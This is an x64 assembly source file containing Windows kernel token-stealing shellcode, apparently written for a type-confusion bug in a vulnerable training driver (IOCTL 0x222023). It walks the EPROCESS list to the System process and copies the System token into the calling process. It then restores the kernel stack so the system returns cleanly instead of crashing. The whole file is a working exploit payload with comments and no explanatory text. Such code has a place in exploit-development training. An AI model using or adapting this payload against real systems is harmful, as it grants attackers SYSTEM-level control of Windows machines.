SECTION .start_magic     
db "magic1" 


SECTION .text
;db 0xcc

start:
	xor rax, rax
	mov rax, [gs:rax + 188h]		; gs[0] == KPCR, Get KPCRB.CurrentThread field
	mov rax, [rax+0xb8]		; Get (KAPC_STATE)ApcState.Process (our EPROCESS)
	mov r9, rax;			; Backup target EPROCESS at r9
	
	; loop processes list
	mov rax, [rax + 0x448]	; +0x448 ActiveProcessLinks : _LIST_ENTRY.Flink; Read first link
	mov rax, [rax]			; Follow the first link
system_process_loop:
	mov rdx, [rax - 0x8]	; ProcessId
	mov r8, rax;			; backup system EPROCESS.ActiveProcessLinks pointer at r8
	mov rax, [rax]			; Next process
	cmp rdx, 4			; System PID
	jnz system_process_loop
	
	mov rdx, [r8 + 0x70]
	and rdx, 0xfffffffffffffff8			; Ignore ref count
	mov rcx, [r9 + 0x4b8]
	and rcx, 0x7
	add rdx, rcx				; put target's ref count into our token
	mov [r9 + 0x4b8], rdx		; rdx = system token; KPROCESS+0x4b8 is the Token, KPROCESS+0x448 is the process links - 0x70 is the diff
	
stack_restore:
	pop rax ; Get stack limit from fake stack
	
    ; Start searching for the Control Code
	sub rax, 0x1000

ctl_code_loop:
	add rax, 8
	mov rcx, [rax]
	cmp rcx, 0x222023 ; TypeConfusion IOCTL
	jnz ctl_code_loop
	
	; Found the control code (otherwise, the read from rax will cause a page fault and crash)
	sub rax, 0xb8
	
	; Fix rsp, copy the function's epilogue 
	mov rsp, rax
	xor rax, rax
	add rsp, 0x20
	pop rbx
	
	retn
	
	
SECTION .end_magic     
db "magic2" 

	